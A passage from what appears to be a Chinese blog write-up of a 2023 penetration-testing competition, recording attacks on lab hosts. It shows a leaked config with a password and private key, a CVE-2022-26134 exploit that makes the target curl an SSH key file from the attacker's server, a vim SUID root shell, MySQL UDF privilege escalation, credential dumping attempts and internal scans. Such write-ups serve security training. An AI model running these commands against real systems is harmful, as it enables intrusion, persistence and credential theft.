class="token file-descriptor important">3</span>&lt;</span>/property<span class="token operator">&gt;</span>     <span class="token operator">&lt;</span>property <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"hibernate.c3p0.validate"</span><span class="token operator">&gt;</span>true<span class="token operator">&lt;</span>/property<span class="token operator">&gt;</span>     <span class="token operator">&lt;</span>property <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"hibernate.connection.autocommit"</span><span class="token operator">&gt;</span>false<span class="token operator">&lt;</span>/property<span class="token operator">&gt;</span>     <span class="token operator">&lt;</span>property <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"hibernate.connection.driver_class"</span><span class="token operator">&gt;</span>com.mysql.jdbc.Driver<span class="token operator">&lt;</span>/property<span class="token operator">&gt;</span>     <span class="token operator">&lt;</span>property <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"hibernate.connection.isolation"</span><span class="token operator">&gt;</span><span class="token operator"><span class="token file-descriptor important">2</span>&lt;</span>/property<span class="token operator">&gt;</span>     <span class="token operator">&lt;</span>property <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"hibernate.connection.password"</span><span class="token operator">&gt;</span>Confluence.12<span class="token operator"><span class="token file-descriptor important">3</span>&lt;</span>/property<span class="token operator">&gt;</span>     <span class="token operator">&lt;</span>property <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"hibernate.connection.provider_class"</span><span class="token operator">&gt;</span>com.atlassian.confluence.impl.hibernate.DelegatingHikariConnectionProvider<span class="token operator">&lt;</span>/property<span class="token operator">&gt;</span>     <span class="token operator">&lt;</span>property <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"hibernate.connection.url"</span><span class="token operator">&gt;</span>jdbc:mysql://localhost/confluence?sessionVariables<span class="token operator">=</span>tx_isolation<span class="token operator">=</span><span class="token string">'READ-COMMITTED'</span><span class="token operator">&lt;</span>/property<span class="token operator">&gt;</span>     <span class="token operator">&lt;</span>property <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"hibernate.connection.username"</span><span class="token operator">&gt;</span>confluence<span class="token operator">&lt;</span>/property<span class="token operator">&gt;</span>     <span class="token operator">&lt;</span>property <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"hibernate.database.lower_non_ascii_supported"</span><span class="token operator">&gt;</span>true<span class="token operator">&lt;</span>/property<span class="token operator">&gt;</span>     <span class="token operator">&lt;</span>property <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"hibernate.dialect"</span><span class="token operator">&gt;</span>com.atlassian.confluence.impl.hibernate.dialect.MySQLDialect<span class="token operator">&lt;</span>/property<span class="token operator">&gt;</span>     <span class="token operator">&lt;</span>property <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"hibernate.hikari.idleTimeout"</span><span class="token operator">&gt;</span><span class="token number">3000</span><span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>/property<span class="token operator">&gt;</span>     <span class="token operator">&lt;</span>property <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"hibernate.hikari.maximumPoolSize"</span><span class="token operator">&gt;</span><span class="token number">6</span><span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>/property<span class="token operator">&gt;</span>     <span class="token operator">&lt;</span>property <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"hibernate.hikari.minimumIdle"</span><span class="token operator">&gt;</span><span class="token number">2</span><span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>/property<span class="token operator">&gt;</span>     <span class="token operator">&lt;</span>property <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"hibernate.hikari.registerMbeans"</span><span class="token operator">&gt;</span>true<span class="token operator">&lt;</span>/property<span class="token operator">&gt;</span>     <span class="token operator">&lt;</span>property <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"hibernate.setup"</span><span class="token operator">&gt;</span>true<span class="token operator">&lt;</span>/property<span class="token operator">&gt;</span>     <span class="token operator">&lt;</span>property <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"jwt.private.key"</span><span class="token operator">&gt;</span>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<span class="token operator">=</span><span class="token operator">&lt;</span>/property<span class="token operator">&gt;</span>     <span class="token operator">&lt;</span>property <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"jwt.public.key"</span><span class="token operator">&gt;</span>MIIBojANBgkqhkiG9w0BAQEFAAOCAY8AMIIBigKCAYEAwPN47Iz3qCt2p045u43/4rGwccTPfuJ/u6JAfTQ+9TjtJskRUAwZmEnhqhtfNDcoAUzv0TXfxlrfbznJb1caNoG4uPlXZg6WA9HAqxeEwTf4QWO434QX/DYRBsoeQI0qhqYRTAgUV7vLZzaMa9VRyj2VWVwu8gRWEvcA1UA+uPiel7IlBe2xazY9ZFnB3SsR1FdZxasgEb6EW8iBN9ZBozVt0RwlA+Bdn5MpzQoYPq+7avL1Dh5X1uuW3K1ADFG1CPa0hJ7DrtaNYGmeWTuAOXrjQNiYevtduLZ0rPZPT6rwAD6aCmu6VvVKU5FL2aeoOidEack7BKKFaiDaGMP4OasDpPKYl49tWuIwbqw+xizhzu5uuBKTkhE3Vjm6zRgsG9u6wtbmm7h5BUgzoi91MvLdx/4JuhrFGr0hXnGvtimymbiqcRO+AKWaJVgns1AbkPEgC5OoJmEtl8NFT4bIn/1hW4AXOT64u0sR9thhcWAybN9ZUV4NkCa+fNLd5c0NAgMBAAE<span class="token operator">=</span><span class="token operator">&lt;</span>/property<span class="token operator">&gt;</span>     <span class="token operator">&lt;</span>property <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"lucene.index.dir"</span><span class="token operator">&gt;</span><span class="token variable">${localHome}</span>/index<span class="token operator">&lt;</span>/property<span class="token operator">&gt;</span>     <span class="token operator">&lt;</span>property <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"spring.datasource.hikari.registerMbeans"</span><span class="token operator">&gt;</span>true<span class="token operator">&lt;</span>/property<span class="token operator">&gt;</span>     <span class="token operator">&lt;</span>property <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"synchrony.encryption.disabled"</span><span class="token operator">&gt;</span>true<span class="token operator">&lt;</span>/property<span class="token operator">&gt;</span>     <span class="token operator">&lt;</span>property <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"synchrony.proxy.enabled"</span><span class="token operator">&gt;</span>true<span class="token operator">&lt;</span>/property<span class="token operator">&gt;</span>     <span class="token operator">&lt;</span>property <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"webwork.multipart.saveDir"</span><span class="token operator">&gt;</span><span class="token variable">${localHome}</span>/temp<span class="token operator">&lt;</span>/property<span class="token operator">&gt;</span>   <span class="token operator">&lt;</span>/properties<span class="token operator">&gt;</span> <span class="token operator">&lt;</span>/confluence-configuration<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>数据库 3306<br>confluence<br>Confluence.123</p>
<p>5.7.42</p>
<p>好像是 mysql 权限，也没 root<br>还得提权？</p>
<p>参考 <a target="_blank" rel="noopener" href="https://www.jianshu.com/p/7cc8ea59578a">confluence 忘记密码</a></p>
<p>cwd_user 表</p>
<pre class="line-numbers language-none"><code class="language-none">admin
{PKCS5S2}zpwacMtAM1bWGcw8W+dVDjt2BFP3BwDXzYcvM6yXYatgXmWq+aOtOQ+GrgFc5FYw


select u.id, u.user_name, u.active from cwd_user u  
join cwd_membership m on u.id=m.child_user_id join cwd_group g on m.parent_id=g.id join cwd_directory d on d.id=g.directory_id  
where g.group_name = 'confluence-administrators' and d.directory_name='Confluence Internal Directory';  

458753

update cwd_user set credential =
'{PKCS5S2}ltrb9LlmZ0QDCJvktxd45WgYLOgPt2XTV8X7av2p0mhPvIwofs9bHYVz2OXQ6/kF'
where id=458753;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>修改密码为 <code>Ab123456</code>，登录</p>
<p><img src="/2023/05/30/Pentest_2023ShanghaiPanshixingdong/7bbc2704-1733-463d-9b7c-d3508a3787c6.png"></p>
<p>还得提权？</p>
<p><del>shell 弹不回来好难受，只能正向打啊啊啊</del></p>
<p>可以弹公网</p>
<p>但是不如直接写私钥然后 ssh 登录</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python CVE-2022-26134.py http://10.103.187.168:8090/ <span class="token string">"mkdir /home/confluence/.ssh/"</span>

python CVE-2022-26134.py http://10.103.187.168:8090/ <span class="token string">"curl vpsip:port/authorized_keys -o /home/confluence/.ssh/authorized_keys"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>Sudo version 1.8.23<br>Sudoers policy plugin version 1.8.23<br>Sudoers file grammar version 46<br>Sudoers I/O plugin version 1.8.23</p>
<p><del>看看 sudo 提权 或者 CVE-2021-4034 pwnkit 那个</del></p>
<p>看起来都不行</p>
<p><img src="/2023/05/30/Pentest_2023ShanghaiPanshixingdong/1390824f-daf3-4a01-bec1-8898ca04dfa0.png"></p>
<h3 id="入口-flag1-192-168-0-12"><a href="#入口-flag1-192-168-0-12" class="headerlink" title="入口 flag1 192.168.0.12"></a>入口 flag1 192.168.0.12</h3><p>草，vim 有 suid 权限</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> -c <span class="token string">':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2023/05/30/Pentest_2023ShanghaiPanshixingdong/3accae35-a11a-4d42-9afd-5b8a23b989ca.png"></p>
<pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">sh-4.2# cat /root/flag
flag{dST7HmECAWgnrv6jDP9Yex18O2QGiVa0}sh-4.2#
sh-4.2# cat /root/提示.txt
管理员留下这些字符串也不知道做什么用
192.168.0.55
2W2mg^v6B6UJNR@Svs<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h3><pre class="line-numbers language-none"><code class="language-none">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1450
        inet 10.103.187.168  netmask 255.255.0.0  broadcast 10.103.255.255
        inet6 fe80::5054:7fff:fe39:dae6  prefixlen 64  scopeid 0x20&lt;link&gt;
        ether 52:54:7f:39:da:e6  txqueuelen 1000  (Ethernet)
        RX packets 240175  bytes 22037866 (21.0 MiB)
        RX errors 0  dropped 331  overruns 0  frame 0
        TX packets 29026  bytes 5772108 (5.5 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1450
        inet 192.168.0.12  netmask 255.255.255.0  broadcast 192.168.0.255
        inet6 fe80::5054:53ff:fe6e:8ffc  prefixlen 64  scopeid 0x20&lt;link&gt;
        ether 52:54:53:6e:8f:fc  txqueuelen 1000  (Ethernet)
        RX packets 70  bytes 8372 (8.1 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 7  bytes 586 (586.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 393857  bytes 49735606 (47.4 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 393857  bytes 49735606 (47.4 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0


(icmp) Target 192.168.0.12    is alive
(icmp) Target 192.168.0.33    is alive
(icmp) Target 192.168.0.55    is alive
[*] Icmp alive hosts len is: 3
192.168.0.33:6379 open
192.168.0.55:3306 open
192.168.0.12:3306 open
192.168.0.55:445 open
192.168.0.55:139 open
192.168.0.55:135 open
192.168.0.33:22 open
192.168.0.12:8091 open
192.168.0.12:8090 open
192.168.0.12:22 open
[*] alive ports len is: 10
start vulscan
[*] NetBios: 192.168.0.55    WORKGROUP\WIN-FGHCOKNHM7P           Windows Server 2016 Datacenter 14393
[*] WebTitle: http://192.168.0.12:8091  code:204 len:0      title:None
[*] WebTitle: http://192.168.0.12:8090  code:302 len:0      title:None 跳转url: http://192.168.0.12:8090/login.action?os_destination=%2Findex.action&amp;permissionViolation=true
[*] WebTitle: http://192.168.0.12:8090/login.action?os_destination=%2Findex.action&amp;permissionViolation=true code:200 len:33317  title:登录 - Confluence
[+] InfoScan:http://192.168.0.12:8090/login.action?os_destination=%2Findex.action&amp;permissionViolation=true [ATLASSIAN-Confluence]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="192-168-0-55-win"><a href="#192-168-0-55-win" class="headerlink" title="192.168.0.55 win"></a>192.168.0.55 win</h3><p><code>2W2mg^v6B6UJNR@Svs</code></p>
<p>用上面的连接信息连</p>
<p>3389 是不是没开不让连啊。。</p>
<p><img src="/2023/05/30/Pentest_2023ShanghaiPanshixingdong/8b91e1e1-20be-4af4-b754-a6d2d2842009.png"></p>
<p><img src="/2023/05/30/Pentest_2023ShanghaiPanshixingdong/23d36c06-3042-413e-9b13-7fcfcb48a072.png"></p>
<p>是不是哪里锅了（</p>
<p>噢，还有 3306 啊</p>
<p><img src="/2023/05/30/Pentest_2023ShanghaiPanshixingdong/f482e48a-f10b-4d03-865c-edc9e8997a97.png"></p>
<p>MySQL 5.5.53</p>
<p>直接 udf 提权</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- select @@basedir;</span>
<span class="token comment">-- C:/Program Files/MySQL/MySQL Server 5.5/</span>

<span class="token keyword">SELECT</span> <span class="token number">0x4d5a90000300000004000000ffff0000</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token number">.0000000000</span> <span class="token keyword">INTO</span> <span class="token keyword">DUMPFILE</span> <span class="token string">'C:\\Program Files\\MySQL\\MySQL Server 5.5\\lib\\plugin\\udf.dll'</span><span class="token punctuation">;</span>
<span class="token keyword">CREATE</span> <span class="token keyword">FUNCTION</span> sys_eval <span class="token keyword">RETURNS</span> STRING <span class="token keyword">SONAME</span> <span class="token string">'udf.dll'</span><span class="token punctuation">;</span>
<span class="token keyword">select</span> sys_eval<span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2023/05/30/Pentest_2023ShanghaiPanshixingdong/2fad66ec-0263-43cb-aaf9-cda343f89679.png"></p>
<p>系统权限好啊！</p>
<pre class="line-numbers language-none"><code class="language-none"> ������ C �еľ�û�б�ǩ��
 ������к��� A696-C4FC

 C:\Users ��Ŀ¼

2023/03/24  15:05    &lt;DIR&gt;          .
2023/03/24  15:05    &lt;DIR&gt;          ..
2023/05/05  14:40    &lt;DIR&gt;          Administrator
2018/02/03  08:23    &lt;DIR&gt;          Public
               0 ���ļ�              0 �ֽ�
               4 ��Ŀ¼ 126,700,122,112 �����ֽ�

 ������ C �еľ�û�б�ǩ��
 ������к��� A696-C4FC

 C:\Users\Administrator\Desktop ��Ŀ¼

2023/05/10  22:18    &lt;DIR&gt;          .
2023/05/10  22:18    &lt;DIR&gt;          ..
2023/05/05  14:39             1,190 RedisDesktopManager.lnk
               1 ���ļ�          1,190 �ֽ�
               2 ��Ŀ¼ 126,700,122,112 �����ֽ�
               
               

Windows IP ����


��̫�������� ��̫�� 2:

   �����ض��� DNS ��׺ . . . . . . . : 
   �������� IPv6 ��ַ. . . . . . . . : fe80::2caf:f7d7:cd87:c5dc%5
   IPv4 ��ַ . . . . . . . . . . . . : 192.168.0.55
   ��������  . . . . . . . . . . . . : 255.255.255.0
   Ĭ������. . . . . . . . . . . . . : 

��������� Reusable ISATAP Interface {1798E6ED-B1D3-4DA3-A24B-2CE5D2862706}:

   ý��״̬  . . . . . . . . . . . . : ý���ѶϿ�����
   �����ض��� DNS ��׺ . . . . . . . :


\\ ���û��ʻ�

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest                    
����������ϣ�������һ����������



�ӿ�: 192.168.0.55 --- 0x5
  Internet ��ַ         �����ַ              ����
  192.168.0.12          52-54-53-6e-8f-fc     ��̬        
  192.168.0.255         ff-ff-ff-ff-ff-ff     ��̬        
  224.0.0.22            01-00-5e-00-00-16     ��̬        
  224.0.0.252           01-00-5e-00-00-fc     ��̬        
  239.255.255.250       01-00-5e-7f-ff-fa     ��̬        
  255.255.255.255       ff-ff-ff-ff-ff-ff     ��̬        



�����

  Э��  ���ص�ַ          �ⲿ��ַ        ״̬           PID
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       708
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:3306           0.0.0.0:0              LISTENING       1800
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       828
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       440
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       964
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       836
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       836
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       1620
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       560
  TCP    0.0.0.0:49670          0.0.0.0:0              LISTENING       1512
  TCP    0.0.0.0:49671          0.0.0.0:0              LISTENING       568
  TCP    192.168.0.55:139       0.0.0.0:0              LISTENING       4
  TCP    192.168.0.55:3306      192.168.0.12:43636     ESTABLISHED     1800
  TCP    192.168.0.55:3306      192.168.0.12:43702     ESTABLISHED     1800
  TCP    192.168.0.55:3306      192.168.0.12:43798     ESTABLISHED     1800
  TCP    [::]:135               [::]:0                 LISTENING       708
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:3389              [::]:0                 LISTENING       828
  TCP    [::]:5985              [::]:0                 LISTENING       4
  TCP    [::]:47001             [::]:0                 LISTENING       4
  TCP    [::]:49664             [::]:0                 LISTENING       440
  TCP    [::]:49665             [::]:0                 LISTENING       964
  TCP    [::]:49666             [::]:0                 LISTENING       836
  TCP    [::]:49667             [::]:0                 LISTENING       836
  TCP    [::]:49668             [::]:0                 LISTENING       1620
  TCP    [::]:49669             [::]:0                 LISTENING       560
  TCP    [::]:49670             [::]:0                 LISTENING       1512
  TCP    [::]:49671             [::]:0                 LISTENING       568
  UDP    0.0.0.0:123            *:*                                    320
  UDP    0.0.0.0:500            *:*                                    836
  UDP    0.0.0.0:3389           *:*                                    828
  UDP    0.0.0.0:4500           *:*                                    836
  UDP    0.0.0.0:5050           *:*                                    320
  UDP    0.0.0.0:5353           *:*                                    1032
  UDP    0.0.0.0:5355           *:*                                    1032
  UDP    127.0.0.1:1900         *:*                                    3200
  UDP    127.0.0.1:49704        *:*                                    3200
  UDP    192.168.0.55:137       *:*                                    4
  UDP    192.168.0.55:138       *:*                                    4
  UDP    192.168.0.55:1900      *:*                                    3200
  UDP    192.168.0.55:49703     *:*                                    3200
  UDP    [::]:123               *:*                                    320
  UDP    [::]:500               *:*                                    836
  UDP    [::]:3389              *:*                                    828
  UDP    [::]:4500              *:*                                    836
  UDP    [::]:5353              *:*                                    1032
  UDP    [::]:5355              *:*                                    1032
  UDP    [::1]:1900             *:*                                    3200
  UDP    [::1]:49702            *:*                                    3200
  UDP    [fe80::2caf:f7d7:cd87:c5dc%5]:1900  *:*                                    3200
  UDP    [fe80::2caf:f7d7:cd87:c5dc%5]:49701  *:*                                    3200
  

ӳ������                       PID �Ự��              �Ự#       �ڴ�ʹ�� 
========================= ======== ================ =========== ============
System Idle Process              0 Services                   0          4 K
System                           4 Services                   0        132 K
smss.exe                       268 Services                   0      1,072 K
csrss.exe                      360 Services                   0      4,068 K
csrss.exe                      432 Console                    1      3,688 K
wininit.exe                    440 Services                   0      5,048 K
winlogon.exe                   492 Console                    1     13,128 K
services.exe                   560 Services                   0      6,868 K
lsass.exe                      568 Services                   0     13,480 K
svchost.exe                    652 Services                   0     13,160 K
svchost.exe                    708 Services                   0      8,000 K
dwm.exe                        820 Console                    1     29,492 K
svchost.exe                    828 Services                   0     13,256 K
svchost.exe                    836 Services                   0     43,116 K
svchost.exe                    908 Services                   0     17,144 K
svchost.exe                    964 Services                   0     13,080 K
svchost.exe                    320 Services                   0     15,656 K
svchost.exe                    628 Services                   0     15,600 K
svchost.exe                   1032 Services                   0     19,308 K
svchost.exe                   1040 Services                   0      6,952 K
svchost.exe                   1512 Services                   0      6,660 K
spoolsv.exe                   1620 Services                   0     15,552 K
svchost.exe                   1672 Services                   0     19,412 K
dllhost.exe                   1748 Services                   0      7,576 K
mysqld.exe                    1800 Services                   0     31,636 K
svchost.exe                   1848 Services                   0      7,956 K
MsMpEng.exe                   1900 Services                   0    167,532 K
qemu-ga.exe                   1916 Services                   0      8,544 K
dllhost.exe                   2044 Services                   0     12,448 K
msdtc.exe                     2184 Services                   0      9,632 K
LogonUI.exe                   2580 Console                    1     41,408 K
svchost.exe                   3200 Services                   0      6,564 K
cmd.exe                       2420 Services                   0      2,756 K
conhost.exe                   2292 Services                   0      7,020 K
tasklist.exe                  2800 Services                   0      7,756 K
WmiPrvSE.exe                  3756 Services                   0      8,464 K<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>mimikatz 被杀了。。<br>MsMpEng.exe &lt;=&gt; Microsoft Security Essentials</p>
<p>直接加个账号练上去，然后关掉 win defender，然后 dump</p>
<p>啥也没有啊</p>
<p><img src="/2023/05/30/Pentest_2023ShanghaiPanshixingdong/8711b5cd-adae-4e0f-b650-fe5631a6d564.png"></p>
<p>不过 Administrator 的桌面上有个 Redis 客户端，估计连的是 192.168.0.33:6379 这个</p>
<p><img src="/2023/05/30/Pentest_2023ShanghaiPanshixingdong/image-20230601201458286.png"></p>
<p>感觉这台机器上哪里存了密码</p>
<p>赛后看了其他队 wp 发现要解本机的 NTLM hash 然后拿去 cmd5 解密得到明文密码，用这个密码就能登录 redis 然后进一步弹 shell</p>
<p><img src="/2023/05/30/Pentest_2023ShanghaiPanshixingdong/image-20230601201856797.png"></p>
<p>好吧，摸了（</p>
<h2 id="漏洞挖掘场景3-2-x2F-4"><a href="#漏洞挖掘场景3-2-x2F-4" class="headerlink" title="漏洞挖掘场景3 [2/4]"></a>漏洞挖掘场景3 [2/4]</h2><h3 id="入口-192-168-33-77-weblogic"><a href="#入口-192-168-33-77-weblogic" class="headerlink" title="入口 192.168.33.77 weblogic"></a>入口 192.168.33.77 weblogic</h3><pre class="line-numbers language-none"><code class="language-none">(icmp) Target 10.103.164.235  is alive
[*] Icmp alive hosts len is: 1
10.103.164.235:22 open
10.103.164.235:7001 open
[*] alive ports len is: 2
start vulscan
[*] WebTitle:http://10.103.164.235:7001 code:404 len:1164   title:Error 404--Not Found
[+] InfoScan:http://10.103.164.235:7001 [weblogic]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>经典 weblogic，直接工具一把梭哈</p>
